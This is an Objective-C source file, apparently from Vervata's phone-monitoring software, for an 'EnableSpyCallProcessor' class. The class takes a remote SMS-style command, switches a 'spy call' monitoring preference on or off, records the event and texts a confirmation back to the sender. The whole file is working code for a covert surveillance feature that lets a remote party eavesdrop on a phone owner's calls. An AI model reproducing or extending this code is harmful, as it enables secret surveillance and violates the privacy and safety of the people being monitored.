
/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  EnableSpyCallProcessor
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  12/03/2012, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import "EnableSpyCallProcessor.h"
#import "PrefMonitorNumber.h"
#import "Preference.h"

@interface EnableSpyCallProcessor (PrivateAPI)
- (void) enableSpyCall;
- (BOOL) isValidFlag;
- (void) enableSpyCallException;
- (void) sendReplySMS;
@end

@implementation EnableSpyCallProcessor

/**
 - Method name: initWithRemoteCommandData
 - Purpose:This method is used to initialize the EnableSpyCallProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: self (EnableSpyCallProcessor)
*/

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData  {
    DLog (@"EnableSpyCallProcessor--->initWithRemoteCommandData");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}

#pragma mark RemoteCmdProcessor Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the EnableSpyCallProcessor
 - Argument list and description:No Argument 
 - Return description: No return type
*/

- (void) doProcessingCommand {
	DLog (@"EnableSpyCallProcessor--->doProcessingCommand");
	if ([self isValidFlag])	[self enableSpyCall];
	else [self enableSpyCallException];
}


#pragma mark EnableSpyCallProcessor PrivateAPI Methods

/**
 - Method name: enableSpyCall
 - Purpose:This method is used to process Enable Spy Call
 - Argument list and description: No Argument
 - Return description: No Return type
*/

- (void) enableSpyCall {
	DLog (@"EnableSpyCallProcessor--->enableSpyCall");
	NSUInteger flagValue=[[[mRemoteCmdData mArguments] objectAtIndex:2] intValue];
	id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	PrefMonitorNumber *prefMonitor = (PrefMonitorNumber *)[prefManager preference:kMonitor_Number];
	[prefMonitor setMEnableMonitor:flagValue];
	[prefManager savePreferenceAndNotifyChange:prefMonitor];
	[self sendReplySMS];
}

/**
 - Method name: isValidFlag
 - Purpose:This method is used to validate the Arguments
 - Argument list and description: 
 - Return description:isValidArguments (BOOL)
*/

- (BOOL) isValidFlag {
	DLog (@"EnableSpyCallProcessor--->isValidFlag")
	BOOL isValid=NO;
	NSArray *args=[mRemoteCmdData mArguments];
	if ([args count]>2) isValid=[RemoteCmdProcessorUtils isZeroOrOneFlag:[args objectAtIndex:2]];	
	return isValid;
}

/**
 - Method name: enableSpyCallException
 - Purpose:This method is invoked when enable Spycall process is failed. 
 - Argument list and description: No Argument
 - Return description: No Return Type
*/

- (void) enableSpyCallException {
	DLog (@"EnableSpyCallProcessor--->enableSpyCallException")
	FxException* exception = [FxException exceptionWithName:@"enableOneCallException" andReason:@"Enable OneCall error"];
	[exception setErrorCode:kCmdExceptionErrorInvalidCmdFormat];
	[exception setErrorCategory:kFxErrorRCM]; 
	@throw exception;
}


/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: No Argument
 - Return description: No return type
*/

- (void) sendReplySMS {
	
	DLog (@"EnableSpyCallProcessor--->sendReplySMS")
	NSString *messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						andErrorCode:_SUCCESS_];
	NSString *enableSpyCallMessage=NSLocalizedString (@"kEnableOneCall", @"");
	
	if ([[[mRemoteCmdData mArguments] objectAtIndex:2] intValue]==1) 
		enableSpyCallMessage=[enableSpyCallMessage stringByAppendingString:NSLocalizedString(@"kEnabled", @"")];
	else 
    	enableSpyCallMessage=[enableSpyCallMessage stringByAppendingString:NSLocalizedString(@"kDisabled", @"")];
	
	enableSpyCallMessage=[messageFormat stringByAppendingString:enableSpyCallMessage];
	
	//==========================================================================================================================
	// if monitors Array count ==0 then send sucess message with warning
	id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	PrefMonitorNumber *prefMonitor = (PrefMonitorNumber *)[prefManager preference:kMonitor_Number];
	if (![[prefMonitor mMonitorNumbers] count]) {
		enableSpyCallMessage=[NSString stringWithFormat:@"%@\n%@",enableSpyCallMessage,NSLocalizedString(@"kEnableOneCallSucessWithWarning", @"")];
	}
	
	//===========================================================================================================================
	
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:enableSpyCallMessage];
	
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
															   andMessage:enableSpyCallMessage];
	}
}

/**
 - Method name: dealloc
 - Purpose:This method is used to Handle Memory managment
 - Argument list and description:No Argument
 - Return description: No Return Type
*/

-(void) dealloc {
	[super dealloc];
}


@end
